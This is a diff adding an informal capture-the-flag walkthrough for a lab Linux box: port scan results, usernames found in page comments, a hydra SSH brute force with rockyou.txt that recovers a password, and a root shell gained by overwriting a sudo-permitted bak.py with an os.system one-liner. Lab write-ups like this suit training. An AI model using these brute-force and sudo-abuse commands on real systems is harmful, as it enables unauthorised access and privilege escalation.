@@ -1,0 +1,43 @@
+
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+
+After going to ip:80 -------> Got usernames in comment section: root, www-data, Anonymous
+
+And the blog belong to meliodas
+
+users: root, www-data, Anonymous, meliodas
+
+After using gobuster found: robots.txt ------> where t was told to use rockyou.txt
+
+It was taking time to bruteforce all users with one txt file ----> So I tried out each name one by one , checking if luck work.
+
+$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.82.17 ssh
+
+---> [22][ssh] host: 10.10.82.17   login: meliodas   password: iloveyou1
+
+Got the user.txt flag after logging in
+
+Now to prev escalate: 
+
+$ sudo -l
+
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+
+
+So what I did is I tried to edit the bak.py to execute "sudo /bin/bash" but to imsefficient permission, i was unable to...
+
+So I removed it then again made a file named: bak.py --->  echo "import os; os.system('sudo /bin/bash')" > bak.py
+
+Then,
+$ sudo /usr/bin/python /home/meliodas/bak.py
+
+To get:
+
+root shell#
+
